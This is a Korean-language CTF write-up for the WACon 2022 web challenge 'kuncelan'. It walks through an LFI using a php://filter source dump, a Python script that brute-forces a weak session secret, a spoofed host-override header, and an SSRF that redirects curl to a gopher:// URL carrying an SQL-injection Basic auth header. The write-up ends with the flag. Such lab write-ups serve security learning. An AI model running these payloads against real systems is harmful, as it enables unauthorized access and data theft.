---
title: "2022 WACon CTF - kuncelan Writeup"
description: "WACon 2022 kuncelan(blackbox) 웹 문제 풀이 - LFI, SSRF, Gopher를 이용한 SQL Injection"
date: 2022-06-18
tags: ["wacon", "lfi", "ssrf", "gopher", "sqli"]
ctf: "WACon CTF 2022"
published: true
---

## kuncelan


[http://114.203.209.112:8000/index.phtml?fun_004ded7246=php://filter/convert.base64-encode/resource=/var/www/html/load](http://114.203.209.112:8000/index.phtml?fun_004ded7246=php://filter/convert.base64-encode/resource=/var/www/html/load)


lfi가 존재한다


```php
<?php

// LOCATION : ./internal_e0134cd5a917.php

error_reporting(0);
session_start();

if (!isset($_SESSION['username']))
{
 header('location: ./login.php');
 die();
}

if (__FILE__ === $_SERVER['SCRIPT_FILENAME'])
{
 die("only in include");
}

function valid_url($url)
{
 $valid = False;
 $res=preg_match('/^(http|https)?:\\/\\/.*(\\/)?.*$/',$url);
 if (!$res) $valid = True;
 try{ parse_url($url); }
 catch(Exception $e){ $valid = True;}
 $int_ip=ip2long(gethostbyname(parse_url($url)['host']));
 return $valid 
 || ip2long('127.0.0.0') >> 24 == $int_ip >> 24 
 || ip2long('10.0.0.0') >> 24 == $int_ip >> 24 
 || ip2long('172.16.0.0') >> 20 == $int_ip >> 20 
 || ip2long('192.168.0.0') >> 16 == $int_ip >> 16 
 || ip2long('0.0.0.0') >> 24 == $int_ip >> 24;
}

function get_data($url)
{

 if (valid_url($url) === True) { return "IP not allowed or host error"; }

 $ch = curl_init();
 $timeout = 7;
 curl_setopt($ch, CURLOPT_URL, $url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, True);
 curl_setopt($ch, CURLOPT_MAXREDIRS, 1);
 curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
 curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
 $data = curl_exec($ch);

 if (curl_error($ch))
 {
 curl_close($ch);
 return "Error !";
 }

 curl_close($ch);
 return $data;
}

function gen($user){
 return substr(sha1((string)rand(0,getrandmax())),0,20);
}

if(!isset($_SESSION['X-SECRET'])){ $_SESSION["X-SECRET"] = gen(); }
if(!isset($_COOKIE['USER'])){ setcookie("USER",$_SESSION['username']); }
if(!isset($_COOKIE['X-TOKEN'])){ setcookie("X-TOKEN",hash("sha256", $_SESSION['X-SECRET']."guest")); }

$IP = (isset($_SERVER['HTTP_X_HTTP_HOST_OVERRIDE']) ? $_SERVER['HTTP_X_HTTP_HOST_OVERRIDE'] : $_SERVER['REMOTE_ADDR']);

$out = "";

if (isset($_POST['url']) && !empty($_POST['url']))
{
 if ( 
 $IP === "127.0.0.1" 
 & $_COOKIE['X-TOKEN'] === hash("sha256", $_SESSION['X-SECRET'].$_COOKIE['USER']) 
 & strpos($_COOKIE['USER'], 'admin') !== false 
 )
 {
 $out = get_data($_POST['url']);
 }
 else
 {
 $out = "Only the administrator can test this function from 127.0.0.1!";
 }

}

?>

<main role="main" class="container">
<h1 class="mt-5">𝖈𝖚𝖗𝖑:// ?</h1>
<p class="lead">cURL is powered by libcurl , used to interact with websites 🌐</p>
<form method="post" >
<legend><label for="url">Website URL</label></legend>
<input class="form-control" type="url" name="url" style="width:100%" />
<input class="form-control" type="submit" value="👉 Request HTTP 👈">
</form><?php echo $out; ?> 
</main>
```


load.phtml 추출된결과


curl 기능을 admin만 localhost에서 쓸 수 있다고 해놨는데, 이는 우회가 가능하다.


```php
function gen($user){
 return substr(sha1((string)rand(0,getrandmax())),0,20);
}

if(!isset($_SESSION['X-SECRET'])){ $_SESSION["X-SECRET"] = gen(); }
if(!isset($_COOKIE['USER'])){ setcookie("USER",$_SESSION['username']); }
if(!isset($_COOKIE['X-TOKEN'])){ setcookie("X-TOKEN",hash("sha256", $_SESSION['X-SECRET']."guest")); }
```


`getrandmax()`로 랜덤값을 뽑아 sha1으로 해싱하고 10바이트만 뽑아서 이를 다시 username과 붙여 sha256 해싱을 한다.


하지만 getrandmax는 21억가량밖에 안되기 때문에, 개인 pc로도 적은시간 안에 해시를 크랙해낼 수 있다.


```py
from arang import *

xtoken = b"b0b32995820dad31a559a8611a610f9b3c57072b8fd757739c3605e50877d2fd"

for i in range(40000000,500000000):
 xsecret = he(sha1(str(i)))[:20]
 t = he(sha256(xsecret+b"guest"))
 if xtoken == t:
 print(xsecret)
 break

 if i % 10000000 == 0:
 print(f"[+] {i} : {xsecret} {t}")
```


대충 이런식으로 해시를 크랙해보면 내 세션에 대한 xsecret값이 나타난다


이제 이 xsecret으로 valid한 admin x-token을 만들어내면 token auth를 우회할 수 있다.


```php
$IP = (isset($_SERVER['HTTP_X_HTTP_HOST_OVERRIDE']) ? $_SERVER['HTTP_X_HTTP_HOST_OVERRIDE'] : $_SERVER['REMOTE_ADDR']);

...

 if ( $IP === "127.0.0.1" ){

...
```


이건`X-HTTP-HOST-OVERRIDE`라는 헤더를 추가해서 127.0.0.1으로 맞춰줌으로써 우회가 가능하다


```php
function valid_url($url)
{
 $valid = False;
 $res=preg_match('/^(http|https)?:\\/\\/.*(\\/)?.*$/',$url);
 if (!$res) $valid = True;
 try{ parse_url($url); }
 catch(Exception $e){ $valid = True;}
 $int_ip=ip2long(gethostbyname(parse_url($url)['host']));
 return $valid 
 || ip2long('127.0.0.0') >> 24 == $int_ip >> 24 
 || ip2long('10.0.0.0') >> 24 == $int_ip >> 24 
 || ip2long('172.16.0.0') >> 20 == $int_ip >> 20 
 || ip2long('192.168.0.0') >> 16 == $int_ip >> 16 
 || ip2long('0.0.0.0') >> 24 == $int_ip >> 24;
}
```


이제 curl기능을 쓸 수 있는데,`valid_url`이라는 검증함수가 존재한다.


1. http/https scheme만 사용 가능
2. host파싱해서 gethostbyname으로 호스트에 해당하는 값을 ip2long으로 long형식 전환
3. /24, /20, /16 등으로 local ip 대역 검증


우회하려고 용좀써봤는데 우회가 안되더라..


```php
$ch = curl_init();
 $timeout = 7;
 curl_setopt($ch, CURLOPT_URL, $url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, True);
 curl_setopt($ch, CURLOPT_MAXREDIRS, 1);
 curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
 curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
 $data = curl_exec($ch);
```


근데 curl 옵션에`CURLOPT_FOLLOWLOCATION`이 존재한다


302 Redirection을 curl이 처리하기때문에 내서버로 보낸다음 302 redirection때리면 될거같다.


```php
<?php
header("Location: gopher://127.0.0.1:80/_POST%20/internal_1d607d2c193b.php%20HTTP/1.1%0d%0aHost:%20127.0.0.1:80%0d%0aAuthorization:%20Basic%20YWRtaW4nfHwxIzpndWVzdA==%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%203%0d%0a%0d%0aa=a%0d%0a%0d%0a");

#header("Location: <http://127.0.0.1:80/internal_e0134cd5a917.php>");
#header("Location: <http://127.0.0.1:80/internal_1d607d2c193b.php>");
?>
```


`load.phtml`에 주석으로 써있던`internal_e0134cd5a917.php`파일을 location으로 돌리면


next file location ㄷㄷ


basic authorization이 없다고 한다


guest:guest로 보내보니`SQL : user not found`라고 한다


아마도 basic authorization을 sql query안에 넣나보다


sqli 구문을 넣어보면[localhost](http://localhost)only라고 한다


이건 아까처럼 특정헤더나 이런거로 우회가 안됐다


Authorization 헤더는 curl로 타사이트에서 302로 전달이 안되기때문에 고심하던 찰나


sqli로 테이블 뽑아보니 플래그 일부가 나왔다


고퍼를 스랜다


```php
header("Location: gopher://127.0.0.1:80/_POST%20/internal_1d607d2c193b.php%20HTTP/1.1%0d%0aHost:%20127.0.0.1:80%0d%0aAuthorization:%20Basic%20YWRtaW4nfHwxIzpndWVzdA==%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%203%0d%0a%0d%0aa=a%0d%0a%0d%0a");
```


gopher로 http raw packet을 만들어 보내면


나머지 패킷 획득


```
**WACon{Try_using_Gophhhher_ffabcdbc}**
```